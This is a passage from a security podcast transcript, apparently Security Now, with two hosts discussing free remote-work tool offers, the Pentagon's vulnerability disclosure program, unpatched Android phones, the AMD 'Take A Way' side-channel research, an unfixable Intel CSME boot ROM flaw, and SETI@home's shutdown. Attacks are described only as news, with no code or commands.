STEVE:  But the other thing, the thing I can do justice to, was when the whole group of them, Ford and Zaphod and there were two others, the gal Trillion and somebody else, they land their spaceship right in the middle of a soccer field, and they get out because they're - I mean, a soccer field on Earth.  They get out, and they start walking away.  And Arthur, who's not like up to speed on all this yet, says, "We just landed our spaceship in the middle of a soccer field."  And I think Ford says, "Yeah, just turn around and look at it."  And so Arthur Dent, he turns around, and the way Douglas describes it, he can't quite focus on it.  His vision just sort of slides off to the side.  And so he's not really sure what's going on.  And he turns back and says,  "What the hell?"  And Ford says, "Yeah, we just turned on the 'somebody else's problem' field."  And Arthur says, "What?"  And Ford says, "Yeah, that's a field which, when you turn it on, and it just sort of, when you see it, it tells your brain that's somebody else's problem."



LEO:  And of course the Infinite Improbability Drive.  And my favorite image of the whale conjured up out of nothing, who falls screaming to the planet Earth and only has time to think, "What's going on?"  And on and on and on.  I mean, what a brilliant, brilliant writer he was.



STEVE:  There was a lot of amazing stuff in there.



LEO:  So good.



STEVE:  Okay.  So apropos of the coronavirus, Microsoft, Google, LogMeIn, and Cisco are all offering limited-time free use of their telecommuting tools.  Now, the cynic in me thinks that perhaps this is marketing opportunism, using a global pandemic to get people hooked on the benefits of stay-at-home work through a time-limited offer.  But on the other hand, we all know how much resistance there is to change.  And in a competitive market, if any of them made their services available for free, the others would be missing out on a true opportunity to expand their user base, hopefully permanently.  So, yeah.  With employees either being quarantined at home after international travel, or being encouraged to work from home, I think Microsoft has shut down their whole campus; right?  They've just said everybody stay home.



So while this COVID-19 coronavirus situation stabilizes, Microsoft, Google, LogMeIn, and Cisco are all offering free use of their meeting collaboration and remote work tools.  And, you know, since avoiding a daily commute can be a very positive thing for one's self, for the environment and everyone else, I wouldn't be surprised if a percentage of those who first make the jump because they really have no choice at the moment might end up embracing the option for the longer term.  My brother-in-law is on the Peninsula down in San Mateo.  And I think he only goes into the city two times a week because both the 101 and the 280 now, which are the main north-south arteries, they're just impassable due to commute traffic.  And so, yeah, if you can do your job from a little desk in an office at home, it's tax deductible for the space that you're using for that.



So anyway, so everybody has a different offer.  Microsoft is making their Teams available at no charge for six months.  Their EVP and President of Microsoft's Global Sales and Marketing Operations tweeted - this is JP Courtois, I guess how you pronounce his name.  He said:  "At Microsoft, the health and safety of employees, customers, partners, and communities is our top priority.  By making Teams available to all for free for six months, we hope that we can support public health and safety by making remote work even easier."



LEO:  Oh, that's clever.



STEVE:  It is.  It's like, okay, yeah.  Google is offering free access to Hangouts Meet for G Suite Users.  Not to be left behind, they announced this week that they are offering G Suite and G Suite for Education customers free access to their Hangouts Meet video conferencing features.  So this includes larger meetings, for up to 250 participants per call; live streaming for up to 100,000 viewers within a domain; and the ability to record meetings and save them to Google Drive.  The announcement stated that:  "These features are typically available in the Enterprise edition of G Suite and G Suite Enterprise for Education, and will be available at no additional charge to all customers until July 1, 2020."



LogMeIn offers free what they call their Emergency Remote Work Kits.  Bill Wagner, who's LogMeIn's CEO, posted a blog titled "Coronavirus Disruptions:  An Offer for Support to Our Communities and Customers."  He stated:  "Starting immediately, we will be offering our critical frontline service providers with free, organization-wide use of many LogMeIn products for three months through the availability of Emergency Remote Work Kits."  He says:  "These kits will include solutions for meetings and video conferencing, webinars and virtual events, IT support, and management of remote employee devices and apps, as well as remote access to devices in multiple locations."  He said:  "For example, the 'Meet' Emergency Remote Work Kit will provide eligible organizations with a free site-wide license of GoToMeeting for three months."  So again, three months.



Cisco is - well, okay.  They've modified their free Webex license to now support meetings with no time limit, that is, the meeting itself has no duration limit, and up to 100 participants.  And in addition, Cisco is now also offering a free 90-day license to businesses that are not currently Webex customers.  Their announcement stated:  "Additionally, through our partners and the Cisco sales team, we are providing free 90-day licenses to businesses who are not Webex customers in this time of need.  We're also helping existing customers meet their rapidly changing needs as they enable a much larger number of remote workers by expanding their usage at no additional cost."  And now that Cisco has finally patched the high-severity vulnerability in Webex, which was allowing strangers to barge into password-protected meetings without any authentication, that offer may be worth considering, as well.



So Cisco is 90 days.  LogMeIn is three months.  Google is until July 1st.  So if we assume a start of April 1st for Google, that's also three months.  Only Microsoft is offering double those free-use durations.  It's offering six months' free use.  And it would be annoying to get all set up on Google, LogMeIn, or Cisco, only to find that corona is taking longer than expected to calm down.  Our illustrious President Trump has famously explained that this whole thing will be disappearing like magic once the weather warms up, which appears to be how Google, LogMeIn, and Cisco set their free-use schedules.



LEO:  Oh, that's interesting.  Until the summer.



STEVE:  Until the summer.



LEO:  Yeah, well, good luck.



STEVE:  But if it should turn out, yeah, if it should turn out that the virus missed Trump's announcement, it might make more sense to run with Microsoft's six-month plan, if their terms offering meets your company's needs.  Or Teams, I meant to say, if their Teams offering.  I don't know about Teams, but are you guys using it?  I heard you mention something.



LEO:  We use Slack.



STEVE:  Oh, okay, Slack.



LEO:  It's interesting.  So like the Webex offer, I think it was, with 100 people for unlimited amount of time, you could see the use would be an office that would normally all be working together, everybody goes home, they all log into that conference, and they just run it all day.  And so...



STEVE:  Just have it in the background.



LEO:  Yeah.  And I do know teams that do this.  And I think it's a - it's not as good as working together, but because it's always on, you can say, "Hey, Joe."  You can kind of participate as if you're all sitting in the same room.



STEVE:  It does bind a community together.



LEO:  Yeah.  It's not as good, but it's a lot safer in this day and age, anyway.  I wonder how much of this...



STEVE:  Especially if Joe is sneezing.



LEO:  Yeah.  I wonder how much of this will be kind of incorporated in the future into just our general work life.  I have a feeling this could be a watershed moment.



STEVE:  Yes.  And that was the point I was making was that I'll bet, I mean, it is nice that the companies are doing this.  But eventually those offers are going to expire.  We also know how much inertia there is to change.  So, you know, companies are sending their employees home for the first time ever, and scrambling around, needing to figure out how to manage that.  So we know that these systems exist.  As I said, my brother-in-law's been doing this for years in high-tech San Francisco-based companies on the Peninsula.  So for them it's no biggie.  You know, maybe he's reduced his two days a week to zero days a week because why not?



But it takes something to overcome inertia.  This, as you say, Leo, could be the thing that gets companies to consider this, to bite the bullet.  And once upon a time not everybody had broadband.  Well, now everybody has broadband.  I mean, you know, everybody's got a connection to the Internet now.  So, yeah.



LEO:  Yeah.  Interesting.



STEVE:  Okay.  So this report, I loved that it said "Unclassified" at the top.  The DOD Cyber Crime Center (because these people love their acronyms, that's the DC3, the DOD Cyber Crime Center, DCCC, so DC3) Vulnerability Disclosure Program (and yes, that's the VDP) Annual Report for 2019, Volume 1.  So this is looking back at how 2019 went.  I've got a link for anyone who's interested in the full report.  Our listeners may recall that four years ago the U.S. Department of Defense first invited white hat hackers to hack into its systems in what was at the time dubbed "Hack the Pentagon."  We had fun with it four years ago.



Today, after four years of success with this initially controversial program, the Pentagon continues to ask hackers to hit them with everything they've got.  And really, what could possibly be more fun than attacking the online presence of our own U.S. Defense Department with their official permission, so that we won't be convicted for doing so.  This just-released report states that after four years these industrious white hats are submitting more vulnerability reports than ever.



The DOD's Department of Defense Cyber Crime Center, that's that DC3, handles the cybersecurity needs for the DOD.  And they're responsible for tasks including cyber technical training and vulnerability sharing.  It also runs this Vulnerability Disclosure Program, the VDP.  The VDP is what emerged from the initial Hack the Pentagon bug bounty program that the military ran back in 2016.  And as I said, that initiative was so successful that it has evolved, and it continues to invite hackers to play with its systems, "play" as in see what mischief you can get up to.



Last year, as we reported - you'll remember this, Leo - the  Air Force even brought an F-15 to DEFCON for hackers to tinker with.  The F-15 Eagle, for those not up on the U.S. military's air combat inventory, is described as an "all-weather, extremely maneuverable, tactical fighter, designed to gain and maintain air superiority in aerial combat."  So yes.  They must have brought it on a - I don't think they probably landed it at Logan.  They must have wheeled it over.  But it was there, and it was powered up, and hackers were seeing what they could do with its avionics wireless systems.



That worked so well that next year the DOD plans to bring a satellite, and hackers will see what they can do with a powered-up satellite.



LEO:  That's scary to think that satellites might be hackable.  Geez.



STEVE:  Yeah, well, I mean, and what's interesting is this is working so well, Leo.  Okay.  We have some numbers about exactly how well.  The report reveals that it processed 4,013 vulnerability reports coming in from a total of 1,460 white hat hackers last year.  So 4,013 reports from 1,460 white hat hackers.  It validated 2,836, so that's just shy of three quarters of all reports, for mitigation.  And this past year was the busiest year for bug reports, representing a 21.7% increase over 2017, the previous busiest year, bringing the total number of bug reports for the program to 12,489.



The report explained:  "These vulnerabilities were previously unknown to the DOD and not found by automated network scanning software, red teams, manual configuration checks, or cyber inspections.  Without DOD VDP (Vulnerability Disclosure Program) there is a good chance," they're writing, "these vulnerabilities would persist to this day or, worse, be active conduits for exploitation by our adversaries."  I mean, this is in the official DOD report.  So, you know, what more does anyone need to know?  This is a crazy good idea.  Information exposure bugs were the most common type reported during this previous year, during 2019, followed by violation of secure design principles, cross-site scripting flaws, business logic errors, and open redirects which can be used to launch phishing attacks.



So moving forward, this Cyber Crime Center wants to expand the scope of the program beyond DOD websites to cover any DOD information system.  It also wants to partner with the Defense Counterintelligence and Security Agency (DCSA) to create what it calls a Defense Industrial Base (of course DIB) VDP program to secure the DOD's supply chain.



You know, all of this is such rare and right thinking on the part of our government.  And this experience should go a long way toward further spreading the bug bounty concept throughout other areas of the U.S.'s massive government bureaucracy.  I mean, here's the DOD saying, come on, bring it on.  We'll pay you some money if you find some problems that we confirm.  And the rest of the government would be nuts not to.  And a report like this that says, you know, we didn't know about these things.  We were looking.  We didn't find them.  But we put up a bounty, and it happened.



Oh, and by the way, the bug bounty program is not being privately managed.  It's being managed by our favorite bug bounty management group, Hacker One.  Which is, I still think, the best place to do these sorts of things.  During the program's first pilot test, which ran only four weeks, from April 18th to May 12th back in 2016, the results were said to exceed all of their wildest expectations.  The first report arrived 13 minutes after the program was initiated.  They had 200 reports within the first six hours, and ended up with a total of 1,410 hackers participating, during which time, during this four weeks, they paid out $75,000 in verified bug bounties.



So at this point I think there's ample proof to suggest that any sizable company ought to be participating in the encouragement of white hat hackers to discover and report important vulnerabilities in their own systems, things that their people just cannot, just will not find.  Anyway, a few thousand dollars of bounty is a small price to pay for the discovery and resolution of remotely targetable vulnerabilities.  So this is a rare instance of the U.S. government planting the flag and leading the way in something that I think is just so useful.



Naked Security site, Sophos Security's Naked Security site, posted some useful detail and insight into one of the worries that I've been recently voicing here a lot.  So I wanted to share what they had to say.  Their piece, published yesterday, was titled "One billion" - with a "b" - "Android smartphones racking up security flaws."  They said:  "How long do Android smartphones and tablets continue to receive security updates after they're purchased?"  They said:  "The slightly shocking answer is barely two years, and that's assuming you bought the handset when it was first released.  Even Google's own Pixel devices max out at three years.  Many millions of users," they write, "hang onto their Android devices for much longer, which raises questions about their ongoing security as the number of serious vulnerabilities continues to grow.



"Add up all the Android handsets no longer being updated, and you get big numbers.  According to Google's developer dashboard last May, almost 40% of Android users still use handsets running versions 5 to 7, which have not been updated for between one and four years.  One in 10 run something even older than that, equivalent to one billion devices."



They said:  "The point is brought home by new testing from consumer group Which? [W-H-I-C-H, that's a site, dot co dot uk] discovering that it was possible to infect popular older handsets mainly running Android 7 - the Motorola X, Samsung Galaxy A5, Sony Xperia Z2, the Google Nexus 5 [and they said] (LG), and the Samsung Galaxy S6 - with mobile malware.  All the above," they said, "were vulnerable to a recently discovered Bluetooth flaw known as BlueFrag, and to the Joker strain of malware from 2017.  The older the device, the more easily it could be infected."



They said Sony's Xperia Z2, running Android 4.4.2, was vulnerable to the Stagefright flaw from 2015.  Of course, Leo, we spent a lot of time back then talking about Stagefright because it was so bad.  It was a flaw in the library that rendered images that runs with kernel privileges.  And because MMS messages were able to send images, just the receipt of a specially crafted MMS message could take over the phone.



And I was curious, so I went to Amazon.  The Sony Xperia Z2 is for sale today on Amazon new.  It is and will always be vulnerable to the very worrisome Stagefright vulnerability where, as I said, just the receipt of a specially crafted MMS message is sufficient to remotely take over the phone.  So here we're selling new Android-based devices which are already out of their update period, will never be updated, and they've got some of the worst, most widespread, well-known vulnerabilities.  So they're vulnerable from the start.



Google recently had to remove 1,700 apps containing Joker, that's the Joker strain of malware from 2017, also known as Bread from its Play Store.  And that's only the latest in its increasingly desperate rearguard action against malware being hosted under its nose on the Google Play Store.  And it's not simply that these devices aren't getting security fixes any longer, but the older models also miss out on a bundle of security and privacy enhancements that Google has added later to versions 9 and 10.



So Kate Bevan, who is a computing editor for Which.co.uk, she was formerly with Naked Security.  She wrote:  "It's very concerning that expensive Android devices have such a short shelf life before they lose security support, leaving millions of users at risk of serious consequences if they fall victim to hackers."  She also raised the interesting point that the idea that a device might only get updates for two years probably comes as a surprise to most Android users.  She said:  "Google and phone manufacturers need to be upfront about security updates, with clear information about how long they will last and what customers should do when they run out."



And of course Google, you know, they're doing the best they can.  They said, in response to this, we're dedicated to improving security for Android devices every day.  We provide security updates with bug fixes and other protections every month and continually work with hardware and carrier partners to ensure that Android users have a fast, safe experience with their devices.  In other words, nothing.  But what can they do?  You know, they are offering Android to third parties to include in smartphones, and they don't have control over what those third parties do in detail.



And, you know, when I was thinking about this issue with awareness, it's true about the difference in smartphone handling versus, for example, PC handling.  Anyone still using Windows 7 will have received, I did, a big full screen warning that it is no longer safe to use this operating system.  You know, you can't not be aware of that fact as a desktop OS user.  But no smartphone suddenly warns its user that it's no longer safe to use it.  They just stop receiving security updates, if they ever get them in the first place after the original sale; and, you know, that's it.  Users just sort of go on not knowing any better.



And Sophos continued, or ended their coverage about this, saying:  "In truth, users are being squeezed between two forces.  On the one hand, Google is determined to drive the evolution of Android for competitive reasons, releasing a new version every year.  On the other side are manufacturers, eager to keep people upgrading to new models on the pretext that the older ones won't run these updated versions of Android," which turns out not to always be true.



They said:  "Security sits somewhere between the two; and despite attempted reforms by Google in recent years to make security fixes happen on a monthly cycle, the reality is some way from that ideal."  And of course we talk about this all the time.  I don't know what we can do about this.



LEO:  Should I stop recommending Android phones and just say you just need to buy an iPhone?  I hate to see a monoculture, but I think it might be prudent.



STEVE:  I know.  I mean, this really is a problem.



LEO:  I mean, I guess it's safe to only buy a Google Android device.  But then even then after three years they stop updating it.



STEVE:  Yeah.  And so, I mean, you could argue we know how important security updates are.  People are being hacked, and this is being leveraged against them.  In the last few months we've talked about specific Android issues which would affect somebody crossing the border, where it's possible for their Bluetooth to be leveraged against them and to put malware on their phone unless they have this most recent, I think it was month's update.  Otherwise, that phone is and will always be vulnerable.



So, I mean, to be responsible, the phone should bring up a warning, make it very clear that this device is no longer receiving security updates.  I mean, it almost ought to be something dismissible, but nagging, you know, on an edge of the screen, where you have to push it, very much like, say, oh, look, we're using cookies on your browser.  It's like yes, and you're forced to say, "Yes, I know."  I mean, we've talked about how annoying that is.  But, I mean, the user should be informed at this point.  And then they could decide whether that matters to them or not.  And maybe you could press a button to get a detail of all the things that have been fixed.



I don't know if your typical Android user cares.  But still, I would say at a minimum, if the phone, if the Android OS detects that it is no longer receiving updates, it should proactively begin notifying its user.  And they can dismiss the notice, but it should come back in a week, and they dismiss it again, and it comes back a week later, just to say, just so you know, you're not getting - this phone is no longer being updated.  And so that would have two effects.  It would inform users.  It would allow them to decide how much they care about this.  It might drive sales of a new phone, or it might drive the phone manufacturers to continue offering updates longer.



I mean, they're choosing not to.  It's not that they couldn't keep those older phones updated.  No one's making them.  And so if the Android OS itself performed that notification task, users would be annoyed if a certain brand of phone started doing that after only two years.  The point is the service life of the phone is much longer than that.  It ought to be kept secure throughout its service life.  And at that point it ought to just shut down.  If it's not going to be kept updated, sorry.



LEO:  It's a good point, yeah.



STEVE:  I mean, you know, the security really is part of what's being delivered.



LEO:  Yeah.  This is a tough one.  I think I'm going to have to just say "Friends don't let friends use Android."



STEVE:  The only way to do it is to be on the Google or maybe on the Samsung train, and be willing to keep yourself current with a new phone.  I mean, many - I know that, you know...



LEO:  It's expensive.  That's the real problem.



STEVE:  It is.  That's exactly right.



LEO:  We're talking a lot of money, yeah.



STEVE:  Yup.  Yup.  Otherwise I think I agree with you, Leo.  You know, Apple is doing a great job of keeping phones that, you know, don't even run on battery any longer, still updated with security.  And, you know, hats off to them.  And I agree with you, no one wants a monoculture.  But everybody I know, with a few exceptions, is the blue bubble in iMessage, and not the green bubble.



LEO:  Now, AMD time.



STEVE:  So our prolific friends from the Graz University of Technology and Research Institute of Computer Science...



LEO:  Kings of fuzzing.



STEVE:  Boy, they are.  They really - they just are on this stuff.  They've got that speculative execution stuff nailed, and working with Random Systems they responsibly disclosed the vulnerabilities to AMD back in August of 2019, so some time ago.  This past Saturday, March 7th, AMD updated their AMD Product Security page with a response to the unwelcome news.  So these guys responsibly disclosed.  Then they recently published, they call it "Take A Way."



What AMD said was:  "We are aware of a new whitepaper that claims potential security exploits in AMD CPUs, whereby a malicious actor could manipulate a cache-related feature to potentially transmit user data in an unintended way.  The researchers then pair this data path with known and mitigated software or speculative execution side-channel vulnerabilities.  AMD believes these are not new speculation-based attacks."  Uh-huh.  So of course AMD has a vested interest in that being true.



These researchers were some of the original guys behind the discovery of Spectre, Meltdown, and ZombieLoad vulnerabilities.  They disagree with AMD's assessment.  Their research paper is titled "Take A Way:  Exploring the Security Implications of AMD's Cache Way Predictors."  So, you know, Take a Way.  Cache Way Predictors is the mechanism that AMD designed for enhancing the performance of their cache.



In the abstract of their full technical disclosure they said:  "To optimize the energy consumption and performance of their CPUs, AMD introduced a way predictor" - that's "way" as in a noun - "a way predictor for the L1-data" - that's L1D cache - "to predict in which way" - this is hard to read - "cache to predict in which cache way a certain address is located."  You know how caches are like n-way caches, like eight-way, four-way.  The point being that normally a cache is much smaller than main memory.



So obviously you can't cache all of main memory.  Well, that means you're caching a small percentage of the total main memory.  That means you're having to map all of memory down into a much smaller cache.  A one-way cache would mean that various locations in main memory all mapped to the same cache slot.  So if you happened to access another of those areas of main memory that collided with an existing one, you would lose the existing values cache.  Because the designers realized that's not a good idea, they then introduced two-way and four-way and eight-way, where essentially you're able to cache up to that many ways of collision in the collapse of all of main memory down into the very much smaller size of the cache.



So it turns out it's better to do an n-way cache where there's depth to the cache than have the cache be one way and wider.  Statistically, you end up with a bigger win.  But which of the ways, for lack of a better term, is going to be used turns out to require some prediction.  You can make the whole n-way cache, for example, an eight-way cache perform better by selecting which one of the ways in the cache slot you use.  So now what they're saying makes sense, right, to predict in which cache way a certain address is located.  Consequently, only this way is accessed, significantly reducing the power consumption of the processor.



So they said:  "In this paper, we are the first to exploit the cache way predictor."  I mean, this stuff is - you can imagine, you can sort of see why it's, like, lain undiscovered for so long.  We were all just happy that it worked, and it was fast.  And then the academics come along, and they go, uh, not so fast.  We're the first, they say, "to exploit the cache way predictor.  We reverse engineered AMD's L1D cache way predictor in microarchitectures from 2011 through 2019, resulting in two new attack techniques."  They have the first one they call Collide+Probe.



They said:  "With Collide+Probe, an attacker can monitor a victim's memory accesses without knowledge of physical addresses or shared memory when timesharing a logical core."  The second one is called Load+Reload.  They said:  "With Load+Reload, we exploit the 'way predictor' to obtain highly accurate memory-access traces of victims on the same physical core.  While Load+Reload relies on shared memory, it does not invalidate the cache line, allowing stealthier attacks that do not induce any last-level cache evictions."



They said:  "We evaluate our new side channel in different attack scenarios.  We demonstrate a covert channel" - and this was surprising - "with up to 588 kbps."  Which is a huge amount of data.  They're able to extract nearly, actually more than  half a mbps through this attack.  They said:  "Which we also use then in a Spectre attack to exfiltrate secret data from the kernel.  Furthermore, we present a key-recovery attack from a vulnerable cryptographic implementation.  We also show an entropy-reducing attack on ASLR of the kernel of a fully patched Linux system, the hypervisor, and our own address space from JavaScript.  Finally, we propose countermeasures in software and hardware mitigating the presented attacks."



So it's often been the case that AMD was skirting, over the last two years, some of these attacks that seemed targeted at Intel.  However, Intel does not use a way predictor.  AMD does.  And so this one is all AMD's.  So in other words, they are by no means immune to attacks similar to those that were affecting Intel.  It was just that the academics hadn't yet turned their attention on AMD.  Whoa.



LEO:  Amazing.



STEVE:  Yeah, I mean, this is all down in the weeds.  I think, you know, that the one thing we keep seeing is that it's the core sharing.  I think what we're going to end up having to do is to isolate the cores in order to get our performance back.  Which is to say that we already know that turning off hyperthreading is the first thing you do for the Intel because hyperthreading explicitly allows threads to share a core.  The problem is it does become more expensive when you're not able to allow cores to share Level 1, Level 2, Level 3 caching.  And so there is that other memory technology that's on the horizon.  Remember, Leo, we talked about it?  I think HP was claiming to have something soon.  It was a XPoint memory.  I've sort of kept my eye on it over time, and it has not gone away.  It's being a little more challenging than people thought.



LEO:  That's not Optane?  That's something different.



STEVE:  Yes.



LEO:  Oh, it is Optane.  Okay.



STEVE:  That's the Optane memory.



LEO:  Yeah.  They renamed it.  XPoint originally, and Optane was the brand.  But they're selling Optane stuff like crazy.



STEVE:  Yeah.  But they haven't yet moved that Optane technology all the way into the processor, or at least nothing [crosstalk].



LEO:  Right.  No, they're using it as smart memory or storage, yeah.



STEVE:  Right.  But it is very, very fast.  And the promise was that it could be way faster than DRAM, yet with a density of mass storage.  So, you know, very compelling-looking.  Or the density at least of - the density of DRAM, yet the speed of static RAM.  That's, you know, we talked about this years ago.  It's still sort of around there.  But it always, you know, we've also talked about battery technology that was going to revolutionize everything years ago.



LEO:  Oh, yeah.



STEVE:  Whatever happened to the supercapacitors?  We're still waiting for those and other miracle next-generation battery stuff.  It's one thing to make one in the lab.  It's another thing to make it work in production and also not mess up the environment, which is something we would like to protect moving forward.



Okay.  And Intel also has a different sort of serious new trouble on its hands.  And, boy, this is going to result in some lawsuits.  On March 5th, last week, that's Thursday, Positive Technologies posted a report titled "Intel x86 Root of Trust:  Loss of Trust."  Which is not to say that it doesn't affect 64-bit.  It does.  Bizarrely, this came as no surprise to Intel.  They were apparently hoping that no one would notice, which is why I really do think they've opened themselves to some lawsuits.



LEO:  That's a unique security stature.



STEVE:  Yeah.



LEO:  Maybe nobody will notice.



STEVE:  Maybe we can - yeah.  So what has effectively happened is that a flaw which is very similar to Apple's unpatchable CheckM8 boot ROM flaw has been found to be present in all Intel processors produced in the last five years.  The exception is the very latest 10th-generation processor which doesn't have the problem because they fixed it.  But all the silicon that all of us are using from Intel in the last five years has a flaw in its ROM.



Okay.  So here's what Positive Technologies had to say.  I've edited it down a bit.  But this is their disclosure because it does a perfect job of explaining it:  "The scenario that Intel system architects, engineers, and security specialists perhaps feared most is now a reality.  A vulnerability has been found in the ROM of the Intel Converged Security and Management Engine."  That's an important acronym.  You'll hear me using that a lot here in the next 10 minutes:  CSME, Converged Security and Management Engine.  In other words, the single point of failure.  It's where everything converges.



They wrote:  "This vulnerability jeopardizes everything Intel has done to build the root of trust and lay a solid security foundation on the company's platforms.  The problem is not only that it is impossible to fix firmware errors that are hard-coded in the Mask ROM of microprocessors and chipsets.  The larger worry is that, because this vulnerability allows a compromise at the hardware level, it destroys the chain of trust for the platform as a whole.



"Positive Technologies specialists," they wrote, "have discovered an error in Intel hardware, as well as an error in Intel CSME firmware, at the very early stages of the subsystem's operation, in its boot ROM.  Intel CSME is responsible for initial authentication of Intel-based systems by loading and verifying all other firmware for modern platforms.  For instance, Intel CSME interacts with CPU microcode to authenticate the UEFI BIOS firmware using BootGuard.  Intel CSME also loads and verifies the firmware of the Power Management Controller responsible for supplying power to Intel's chipset components.



"Even more importantly, Intel CSME is the cryptographic basis for hardware security technologies developed by Intel and used everywhere, such as DRM, TPM, and Intel Identity Protection.  In its firmware, Intel CSME implements EPID (that's Enhanced Privacy ID).  EPID is a procedure for remote attestation of trusted systems that allows identifying individual computers unambiguously and anonymously, which has a number of uses.  These include protecting digital content, securing financial transactions, and performing IoT attestation.  Intel CSME firmware also implements the TPM software module which allows storing encryption keys without needing an additional TPM chip."  And many computers no longer have such chips because Intel moved it into their own domain, and now it turns out that's not secure.



"Intel tried to make this root of trust as secure as possible.  Intel security is designed so that even arbitrary code execution in any Intel CSME firmware module would not jeopardize the root cryptographic key, what they refer to as the 'chipset key,' but only the specific functions of that particular module.



"Unfortunately," they write, "no security system is perfect.  Like all security architectures, Intel's had a weakness, the boot ROM in this case.  An early stage vulnerability in ROM enables control over reading of the chipset key and the generation of all other encryption keys.  One of these keys is for the Integrity Control Value Blob" - literally, Integrity Control Value Blob (ICVB).  "With this key [or blob], attackers can forge the code of any Intel CSME firmware module in any way that authenticity checks cannot detect.  This is functionally equivalent to a breach of the private key for the Intel CSME firmware digital signature, but is limited to a specific platform."



They go on.  There's one thing I wanted not to miss.  Ah, yeah.  "The vulnerability discovered" - oh, no, here.  "And since the ROM vulnerability allows seizing control of code execution before the hardware key generation mechanism in the Secure Key Storage is locked, and the ROM vulnerability cannot be fixed, we believe that extracting this key is only a matter of time.  When this happens," they wrote, "utter chaos will reign."  Or maybe my word, "mayhem."  "Hardware IDs will be forged, digital content will be extracted, and data from encrypted hard disks will be decrypted.



"The vulnerability discovered by Positive Technologies affects the Intel CSME boot ROM on all Intel chipsets and SoCs available today other than Ice Point."  That's, as I said earlier, the 10th-generation build.  "The vulnerability allows extracting the Chipset Key and manipulating part of the hardware key and the process of its generation.  However, currently it is not possible to obtain that key's hardware component, which is hard-coded in the SKS directly.  The vulnerability also sets the stage for arbitrary code execution with zero-level privileges in the Intel CSME."



They said:  "We will provide more technical details in a full-length whitepaper to be published soon.  We should point out that, when our specialists contacted Intel to report the vulnerability, Intel said the company was already aware of it."  CVE-2019-0090, okay, that's a low number.  That's a low CVE-2019 number, 90.



"Intel understands they cannot fix the vulnerability in the ROM of existing hardware.  So they are trying to block all possible exploitation vectors.  The patch for CVE-2019-0090 addresses," they write, "only one potential attack vector involving the Integrated Sensors Hub.  We think there might be many ways to exploit this vulnerability in ROM.  Some of them might require local access; others need physical access."



Okay.  So what does this mean?  It means that all Intel processors released in the past five years contain an unpatchable vulnerability that could allow hackers to compromise almost every hardware-enabled security technology that's designed to shield sensitive data of users, even when a system is compromised, that is, to keep it protected even under compromise.  And as with Apple's CheckM8, because the vulnerability resides in ROM, it cannot be repaired without replacing the chip.



This Intel CSME is a separate security microcontroller incorporated into the processors that provides an isolated execution environment protected from the host operating system running on the main CPU.  Maybe it would be possible to exchange with an identical processor that is, you know, same processor, but with the ROM, this CSME ROM fixed, and we'll see what happens.  The CSME is responsible for the initial authentication of Intel-based systems by loading and verifying firmware components, the root of trust-based secure boot, and cryptographically authenticates the BIOS, Microsoft System Guard, BitLocker, and other security features.  Intel obfuscated and dramatically downplayed this problem when it was previously patched last year.  At that time, Intel described it as a "privilege escalation and arbitrary code execution" in Intel CSME firmware modules.



And remember the researchers wrote:  "Since the ROM vulnerability allows seizing control of code execution before the hardware key generation mechanism is locked, and the ROM vulnerability cannot be fixed, we believe," they wrote, "that extracting this key is only a matter of time.  When this happens, utter chaos will reign.  Hardware IDs will be forged, digital content will be extracted, and data from encrypted hard disks will be decrypted."  And if the guys from Graz University are listening, they're probably rubbing their hands together right now.  It's like, oh, goodie.  Something new that we can go and demonstrate, turn into proof of concept.



There is no proof of concept code yet, but this is something Intel knew about.  It seriously, I mean, if the guys that did this research at Positive Technologies are correct, then this is potentially not good.  However, we haven't - there's been no discussion yet of what it takes to leverage this in fact.  And this is not going to be remotely exploitable.  It's possible to do very clever things during a reboot.  So I don't know, if a bad guy got in and could reboot the system, if that would allow them to get control.  It may need actual physical access.



On the other hand, there are many instances where we're presuming that our Intel-based systems are protected against physical access using TPM.  The whole point of storing this stuff in storage that cannot be read is physical access doesn't let you read it.  So, you know, most of the people who are listening to this podcast are never going to be affected by this.  But this is a serious issue for Intel to deal with.  And so far it looks like they have - you can imagine when this came to their attention somehow a year ago, after already a year of Spectre and Meltdown, they must have just been thinking, oh, please.  We liked it when we were just printing money.  Actually having to have secure processors, that's much harder.  And Leo.



LEO:  Yes?



STEVE:  SETI@home.



LEO:  Oh, I know.



STEVE:  Is shutting down its distributed computing project after 21 years.



LEO:  How many aliens did we find?



STEVE:  Yeah, that's a problem.  But there's a theory about that.



LEO:  Oh.



STEVE:  SETI, of course, is the Search for Extraterrestrial Intelligence.  And Leo, in light of recent events, the team has decided to turn their search inward and start searching for any signs of terrestrial intelligence.



LEO:  Good luck on that.



STEVE:  Yeah.  I don't know.



LEO:  You're going to need more than a telescope to find that.



STEVE:  Okay, well, no.  But at the end of this month, exactly three weeks from today, on March 31st, they will be evolving their very cool 21-year-long project.  They're not giving up.  But it's time to figure out what, if anything, they have found during this period.  So as many of us know, SETI@home is a long-lived, multidecade, 21-year-long distributed computing project where throughout these last 21 years, and thanks to the global Internet, volunteers spread across the world have been contributing their spare CPU cycles to analyze raw data received from the Arecibo Radio Telescope in Puerto Rico and West Virginia's Green Bank Telescope for signs of coherent and organized radio emanations, which we presume and hope would invariably arise from any non-Earthly intelligent beings.



So during this 21-year run, UC Berkeley's SETI Research Center, which went online on May 17 of 1999, has been sending small chunks of raw data out to volunteers.  Each of these little chunks forms a job to volunteers.  The raw data are being siphoned in a piggyback form passively, while those two telescopes are being used for other scientific programs.  So they're not having to be dedicated to SETI.  SETI just said, hey, would you mind if we tap in and process all the noise that you're listening to?  And the scope said, "Yeah, cool, you know, because we like aliens."  I mean, they're out there peering into the past.



So the data are digitized, stored, and then sent out through the SETI@home facility. They're divided up, both in frequency and in time, and then analyzed to search for signals, where signals are defined as variations that cannot be ascribed to noise and hence contain information.  Using distributed computing, SETI@home sends millions of chunks of data to the home computers of users who are participating.



I was curious, so I did a little bit of digging.  The software searches for five types of signals that distinguish them from noise, that is, that would distinguish the signals from noise.  They look for spikes in power spectra; Gaussian rises and falls in transmission power, which would possibly represent the telescope's beam passing over a radio source.  They look for triplets, which are three power spikes in a row; also pulsing signals that possibly represent a narrow-band digital-style transmission.  And they perform autocorrelation to detect signal within the waveforms.



So last week what the SETI guys said was, they said:  "On March 31st, the volunteer computing portion of SETI@home will stop distributing work and will go into hibernation."  They said:  "We're doing this for two reasons:  First, scientifically, we're at the point of diminishing returns; basically, we've processed all the data we need for now.  Second, it's a lot of work for us to manage the distributed processing of data.  We need to focus on completing the back-end analysis of the results we already have, and writing this up in a scientific journal paper."



